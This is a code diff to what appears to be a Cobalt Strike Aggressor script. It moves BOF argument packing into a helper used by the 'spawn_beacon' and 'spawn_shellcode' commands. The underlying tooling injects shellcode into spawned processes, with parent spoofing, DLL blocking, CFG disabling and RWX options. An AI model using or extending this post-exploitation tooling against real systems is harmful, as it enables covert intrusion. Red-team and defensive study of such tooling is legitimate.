@@ -186,6 +186,19 @@ sub preflight_validate_execution {
 }
 
 # ================================================================
+# HELPER: PACK BOF ARGUMENTS (CONTRACT-CRITICAL ORDER)
+# ================================================================
+sub pack_spawn_args {
+    # Keep this field order aligned with Src/Bof.c::go() parser:
+    # Z process | Z parent | Z cwd | Z cmd | i block_dll | i disable_cfg
+    # | i use_rwx | i exec_method | b shellcode
+    return bof_pack($1, "ZZZZiiiib",
+        $process_spawn, $parent_process, $working_dir, $cmd_line,
+        $2, $3, $4, $5,
+        $6);
+}
+
+# ================================================================
 # HELPER: GET BOF PATH
 # ================================================================
 sub get_bof_path {
@@ -270,10 +283,7 @@ alias spawn_beacon {
     println("=" x 60 . "\n");
 
     # Pack arguments and execute
-    $args = bof_pack($1, "ZZZZiiiib", 
-        $process_spawn, $parent_process, $working_dir, $cmd_line, 
-        $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, 
-        $shellcode);
+    $args = pack_spawn_args($1, $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, $shellcode);
     
     beacon_inline_execute($1, $data, "go", $args);
 }
@@ -347,10 +357,7 @@ alias spawn_shellcode {
     println("=" x 60 . "\n");
 
     # Pack arguments and execute
-    $args = bof_pack($1, "ZZZZiiiib", 
-        $process_spawn, $parent_process, $working_dir, $cmd_line, 
-        $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, 
-        $shellcode);
+    $args = pack_spawn_args($1, $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, $shellcode);
     
     beacon_inline_execute($1, $data, "go", $args);
 }
